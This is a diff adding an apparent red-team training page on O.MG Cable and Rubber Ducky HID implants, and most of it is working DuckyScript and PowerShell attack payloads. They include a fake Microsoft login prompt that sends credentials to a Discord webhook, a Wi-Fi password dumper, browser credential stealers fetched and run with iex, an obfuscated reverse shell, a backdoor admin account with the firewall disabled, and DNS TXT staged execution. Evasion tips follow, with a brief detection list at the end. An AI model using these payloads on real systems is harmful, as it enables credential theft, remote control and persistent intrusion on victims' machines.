@@ -1,0 +1,345 @@
+---
+layout: training-page
+title: "O.MG Cable &amp; Hardware Implant Payloads — Red Team Academy"
+module: "Wireless Attacks"
+tags:
+  - omg-cable
+  - duckyscript
+  - hid-attack
+  - hardware-implant
+  - physical-access
+page_key: "wireless-omg-cable"
+---
+<h1>O.MG Cable &amp; Hardware Implant Payloads</h1>
+  <p>The O.MG Cable is a hardware implant disguised as a standard USB cable (Lightning, USB-C, USB-A). Internally it contains a Wi-Fi enabled microcontroller that emulates a USB HID device (keyboard/mouse). When plugged in, it can execute payloads stored on the device or delivered over Wi-Fi — all while appearing to be an ordinary charging cable. Used in physical intrusion engagements and red team scenarios requiring clandestine access to air-gapped or locked workstations.</p>
+
+  <h2>Hardware Overview</h2>
+  <pre><code># O.MG Cable variants (Hak5):
+# - O.MG Cable (Lightning, USB-C, USB-A)
+# - O.MG Plug (USB-A stub, no cable)
+# - O.MG Adapter (USB-C to USB-A)
+# Firmware 3.0+ required for full DuckyScript 3.0 support
+
+# Capabilities:
+# - USB HID keyboard/mouse emulation (types keystrokes at hardware speed)
+# - Built-in Wi-Fi (802.11 b/g/n) — acts as AP or connects to target network
+# - Payload storage (internal flash)
+# - Remote trigger via Wi-Fi — detonate payload at a chosen time
+# - Keylogger mode — capture all keystrokes to internal memory
+# - Self-destruct (erase payload after execution)
+
+# Similar tools covered by same payloads:
+# - Hak5 USB Rubber Ducky (DuckyScript compatible, no Wi-Fi)
+# - Bash Bunny (multi-vector, USB mass storage + HID)
+# - Digispark / Attiny85 (Arduino-based, similar DuckyScript)
+
+# Physical attack scenarios:
+# - Leave on desk / drop in parking lot (curiosity bait)
+# - Social engineer target into plugging in "found cable"
+# - Plant during physical access (evil maid, insider threat simulation)
+# - Replace target's actual cable during brief unsupervised access</code></pre>
+
+  <h2>DuckyScript 3.0 Syntax</h2>
+  <pre><code># DuckyScript is the scripting language for O.MG, Rubber Ducky, and compatible devices.
+# Full reference: github.com/hak5/usbrubberducky-payloads
+
+# Core commands:
+REM            # Comment (not executed)
+DELAY 1000     # Wait 1000ms (1 second)
+STRING text    # Type the literal string (no newline)
+STRINGLN text  # Type string and press ENTER
+ENTER          # Press Enter key
+GUI r          # Windows key + R (opens Run dialog)
+CTRL c         # Ctrl+C
+ALT F4         # Alt+F4
+
+# Key names: GUI, ALT, CTRL, SHIFT, ENTER, ESCAPE, TAB, SPACE,
+#            DELETE, BACKSPACE, HOME, END, INSERT, PAGEUP, PAGEDOWN,
+#            UP, DOWN, LEFT, RIGHT, CAPSLOCK, F1-F12
+
+# Variable definitions (DuckyScript 3.0):
+DEFINE #TARGET_IP 192.168.1.100
+DEFINE #PORT 4444
+# Use in STRING: STRING $c = new-object net.webclient; $c.downloadstring(#TARGET_IP)
+
+# Keyboard language:
+DUCKY_LANG us  # US layout (default)
+DUCKY_LANG de  # German layout (important — wrong layout = garbled output)
+DUCKY_LANG uk  # UK layout
+
+# Typical attack flow:
+DELAY 1500         # Wait for OS to recognize device
+GUI r              # Open Run dialog
+DELAY 500
+STRINGLN powershell -NoP -NonI -w H    # Run PowerShell hidden
+DELAY 500
+STRING [PAYLOAD HERE]
+ENTER
+CAPSLOCK           # Some O.MG payloads use CAPSLOCK as delimiter</code></pre>
+
+  <h2>Credential Harvesting Payloads</h2>
+
+  <h3>Fake Microsoft Login Prompt</h3>
+  <pre><code>REM Title: -OMG-Credz-Plz
+REM Author: I-Am-Jakoby
+REM Description: Displays a fake "Unusual sign-in" Microsoft credential prompt.
+REM              Credential entered by target is exfiltrated to Dropbox/webhook.
+REM Target: Windows 10/11
+REM Requirements: Dropbox API or webhook.site URL
+
+DELAY 1500
+GUI r
+DELAY 500
+STRINGLN powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://YOUR_DROPBOX_LINK?dl=1; invoke-expression $pl
+DELAY 2000
+
+# The PS script (Credz-Plz.ps1) on your server:
+# Add-Type -AssemblyName Microsoft.VisualBasic
+# $cred = [Microsoft.VisualBasic.Interaction]::InputBox(
+#   "Unusual sign-in activity detected. Please re-enter your Microsoft credentials:",
+#   "Microsoft Security", "")
+# while ($cred -eq "") {
+#   $cred = [Microsoft.VisualBasic.Interaction]::InputBox("Authentication Required", "Microsoft Security", "")
+# }
+# $webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID"
+# Invoke-WebRequest $webhook -Method POST -Body (@{content="Creds: $cred"} | ConvertTo-Json) -ContentType "application/json"</code></pre>
+
+  <h3>WiFi Password Dumper</h3>
+  <pre><code">REM Title: wifigrabber
+REM Description: Dumps all saved WiFi profiles with cleartext keys,
+REM              exfiltrates via HTTP POST to webhook.site or similar.
+REM Target: Windows 10/11
+REM Requirements: webhook.site URL or your own HTTP listener
+
+DELAY 3000
+GUI r
+DELAY 500
+STRINGLN cmd /k mode con: cols=15 lines=1
+DELAY 500
+STRING cd %temp%
+ENTER
+DELAY 500
+STRING netsh wlan export profile key=clear
+ENTER
+DELAY 1000
+STRING powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS
+ENTER
+DELAY 3000
+STRING powershell Invoke-WebRequest -Uri https://webhook.site/YOUR-ID -Method POST -InFile Wi-Fi-PASS
+ENTER
+DELAY 3000
+STRING del Wi* /s /f /q
+ENTER
+DELAY 1000
+Exit
+
+# Equivalent one-liner (for use in other payloads):
+(netsh wlan show profiles) | Select-String ":(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{SSID=$name; Password=$pass}} | Format-Table -AutoSize</code></pre>
+
+  <h3>Browser Credential Harvesting</h3>
+  <pre><code">REM Title: SamDumpCable / WLAN-Windows-Passwords
+REM Description: Drop browser credential dumpers via PowerShell
+
+# Chrome passwords (multiple methods):
+REM Method 1 — Get-ChromeCreds2 (best in class):
+DELAY 1500
+GUI r
+DELAY 500
+STRINGLN powershell -w h iex (iwr https://raw.githubusercontent.com/kerrymilan/Get-ChromeCreds2/master/Get-ChromeCreds2.ps1)
+DELAY 3000
+
+REM Method 2 — chrome-passwords binary:
+STRINGLN powershell -w h "wget https://github.com/adnan-alhomssi/chrome-passwords/raw/master/bin/chrome-passwords.exe -o $env:temp\cp.exe; &$env:temp\cp.exe >> $env:temp\cp.txt"
+
+# Firefox passwords:
+STRINGLN powershell -w h "iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/collection/Get-FoxDump.ps1); get-foxdump"
+
+# All browser passwords (NirSoft WebBrowserPassView):
+STRINGLN powershell -w h "wget https://www.nirsoft.net/toolsdownload/webbrowserpassview_setup.exe -o $env:temp\wbpv.exe; &$env:temp\wbpv.exe /stext $env:temp\passwords.txt"</code></pre>
+
+  <h2>Reverse Shell Payloads</h2>
+
+  <h3>PowerShell TCP Reverse Shell</h3>
+  <pre><code>REM Title: ReverseCable
+REM Author: 0i41E
+REM Description: PowerShell TCP reverse shell, runs hidden in background.
+REM Target: Windows (PowerShell)
+REM Requirements: nc -lvnp 4444 on attacker
+
+DEFINE #ADDRESS 10.10.14.5
+DEFINE #PORT 4444
+
+DUCKY_LANG us
+DELAY 1500
+GUI r
+DELAY 500
+STRINGLN powershell -NoP -NonI -w H
+
+DELAY 250
+STRING $c=nEw-oBjECt SYstEm.NEt.SOcKEts.TCPClIEnt(#ADDRESS,#PORT);$s=$c.GetSTreAm();[byte[]]$b=0..65535|%{0};whILe(($i=$
+DELAY 100
+STRING s.REad($b,0,$b.LeNgTh))-ne 0){;$d=(NEw-OBjeCT -TYpeNamE sYsTeM.TeXt.ASCIIEncoding).GetStRIng($b,0,$i);$z=(ieX $d 2>&1|oU
+DELAY 100
+STRINGLN t-STriNG);$x=$z+"Shell# "+(pwd)+">";$y=([text.encoding]::ASCII).GEtByTEs($x);$s.WrIte($y,0,$y.LEnGTh);$s.FlUSh()};$c.CloSE()
+CAPSLOCK
+
+# Start listener on attacker:
+nc -lvnp 4444
+
+# SSL reverse shell (ReverseCableSSL):
+# Use same pattern but wrap with New-Object Net.Security.SslStream
+# Requires self-signed cert on listener; defeats SSL inspection when browsing to HTTPS</code></pre>
+
+  <h3>WinRM &amp; SMB Backdoor</h3>
+  <pre><code">REM Title: win_winrm-backdoor
+REM Description: Enable WinRM, add a backdoor local admin account for remote access
+REM Requires: Admin rights on target (or UAC bypass)
+
+DELAY 1500
+GUI r
+DELAY 500
+STRINGLN powershell -NoP -NonI -w H -Exec Bypass
+
+DELAY 500
+STRING Enable-PSRemoting -Force; Set-Item WSMan:\localhost\Client\TrustedHosts * -Force;
+ENTER
+DELAY 500
+STRING net user backdoor P@ssw0rd123! /add; net localgroup Administrators backdoor /add
+ENTER
+DELAY 500
+String Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+ENTER
+
+# After execution — connect from attacker:
+evil-winrm -i TARGET_IP -u backdoor -p 'P@ssw0rd123!'
+
+REM Title: win_smb-backdoor
+REM Description: Activate SMB, enable file sharing, add admin account
+STRING Set-SmbServerConfiguration -EnableSMB2Protocol $true -Force;
+ENTER
+STRING New-SmbShare -Name "Share" -Path "C:\" -FullAccess backdoor
+ENTER
+# Connect: smbclient //TARGET_IP/Share -U backdoor%'P@ssw0rd123!'
+# Or: net use \\TARGET_IP\Share /user:backdoor P@ssw0rd123!</code></pre>
+
+  <h2>Exfiltration Payloads</h2>
+
+  <h3>Discord Webhook Exfil</h3>
+  <pre><code">REM Title: c2-data-exfil-discord
+REM Description: Exfiltrate data to a Discord webhook — blends with legitimate traffic.
+REM Webhook: Create in Discord server → Settings → Integrations → Webhooks
+
+# PowerShell function to send files to Discord:
+$webhook = "https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN"
+
+function Send-ToDiscord($file) {
+    $form = @{ file = Get-Item $file }
+    Invoke-RestMethod -Uri $webhook -Method Post -Form $form
+}
+
+# Quick exfil snippets via webhook:
+$wh = "https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN"
+# Send text:
+Invoke-WebRequest -Uri $wh -Method POST -Body (@{content=(whoami)} | ConvertTo-Json) -ContentType "application/json"
+
+# Send file:
+$multipart = [System.Net.Http.MultipartFormDataContent]::new()
+$file = [System.IO.File]::ReadAllBytes("C:\Windows\Temp\passwords.txt")
+$fileContent = [System.Net.Http.ByteArrayContent]::new($file)
+$multipart.Add($fileContent, "file", "passwords.txt")
+(New-Object System.Net.Http.HttpClient).PostAsync($wh, $multipart).Wait()</code></pre>
+
+  <h3>Staged Payload via DNS TXT Record</h3>
+  <pre><code">REM Title: DNS-based payload staging (NS-Lookup technique)
+REM Description: Download and execute payload stored in DNS TXT record.
+REM              Avoids HTTP-based detection — DNS traffic rarely inspected.
+
+# Set up: add TXT record to your domain:
+# dig TXT payload.attacker.com → "powershell -enc BASE64_PAYLOAD"
+
+# O.MG payload to trigger DNS-based execution:
+DELAY 1500
+GUI r
+DELAY 500
+STRINGLN powershell -w h -NoP -NonI -Exec Bypass
+
+DELAY 500
+# Resolve TXT record and execute the content:
+STRINGLN $cmd=(Resolve-DnsName -Name payload.attacker.com -Type TXT).Strings; iex $cmd
+
+# Set TXT record content (base64 encode your payload):
+# python3 -c "import base64; print(base64.b64encode(b'calc.exe').decode())"
+# Or a full reverse shell:
+# echo -n '$c=New-Object Net.Sockets.TCPClient("10.10.14.5",4444);...' | iconv -t utf-16le | base64 -w0</code></pre>
+
+  <h2>Recon Payloads</h2>
+  <pre><code">REM Title: Quick Host Recon
+REM Description: Perform host enumeration and exfiltrate via webhook.
+REM Target: Windows 10/11
+
+DELAY 1500
+GUI r
+DELAY 500
+STRINGLN powershell -w h -NoP -NonI
+
+DELAY 500
+# Collect host info (no net/ipconfig/whoami commands — less detection):
+STRING $info = @{
+ENTER
+STRING   hostname = $env:COMPUTERNAME;
+ENTER
+STRING   user = $env:USERNAME;
+ENTER
+STRING   domain = $env:USERDOMAIN;
+ENTER
+STRING   ip = (Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "IPEnabled=True").IPAddress;
+ENTER
+STRING   os = (Get-WmiObject Win32_OperatingSystem).Caption;
+ENTER
+STRING   local_admins = (Get-LocalGroupMember Administrators).Name;
+ENTER
+STRING   av = (Get-ChildItem $env:SystemDrive\Windows\System32\drivers | where Name -match "\.sys$" | select Name) -join ",";
+ENTER
+STRING } | ConvertTo-Json
+ENTER
+STRING Invoke-WebRequest "https://webhook.site/YOUR-ID" -Method POST -Body $info -ContentType "application/json"
+ENTER
+
+# Alternative: OMGLogger — enable keylogger mode via O.MG web interface
+# Logs all keystrokes to internal flash, retrieve via Wi-Fi when near the device</code></pre>
+
+  <h2>Detection &amp; OPSEC</h2>
+  <pre><code"># Detection indicators:
+# - New HID device appears (USB descriptor: keyboard/mouse)
+# - Rapid keystroke activity immediately after USB plug-in
+# - PowerShell process spawned from unusual parent (explorer.exe)
+# - Network connection to external IP immediately after USB plug
+# - New processes run from %TEMP% shortly after cable plug
+
+# OPSEC improvements:
+# 1. Add longer initial DELAY (5000-10000ms) before any keystroke activity
+#    → Avoids triggering HID-based defenses on USB plug
+# 2. Obfuscate PowerShell strings (mixed case, aliases, encoding)
+#    → IEX → iEx → i`eX → &([scriptblock]::Create(...))
+# 3. Use DNS exfil instead of HTTP → bypasses web proxy logging
+# 4. Self-destruct: O.MG firmware can wipe payload after execution
+# 5. Only activate via Wi-Fi trigger (don't auto-run on plug)
+#    → Allows placement and controlled remote detonation
+
+# Network-based detection (blue team):
+# - Monitor for new USB device events (EventID 2003 in WinRM log)
+# - EDR: flag processes spawned within seconds of USB device connect
+# - Monitor DNS for unusual TXT record queries
+# - PowerShell ScriptBlock logging (EventID 4104) captures inline commands</code></pre>
+
+  <h2>Resources</h2>
+  <ul>
+    <li>O.MG Cable — <code>shop.hak5.org/collections/mischief-gadgets</code></li>
+    <li>O.MG Wiki — <code>github.com/O-MG/O.MG-Firmware/wiki</code></li>
+    <li>OMG Payloads repo — <code>github.com/I-Am-Jakoby/hak5-submissions/tree/main/OMG</code></li>
+    <li>Hak5 payload library — <code>github.com/hak5/usbrubberducky-payloads</code></li>
+    <li>PowerShell for Hackers — <code>github.com/I-Am-Jakoby/PowerShell-for-Hackers</code></li>
+    <li>DuckyScript 3.0 docs — <code>docs.hak5.org/hak5-usb-rubber-ducky</code></li>
+    <li>Webhook.site — <code>webhook.site</code> — free HTTP request inspection for testing exfil</li>
+    <li>Interactsh — <code>github.com/projectdiscovery/interactsh</code> — OOB interaction server (DNS, HTTP)</li>
+  </ul>
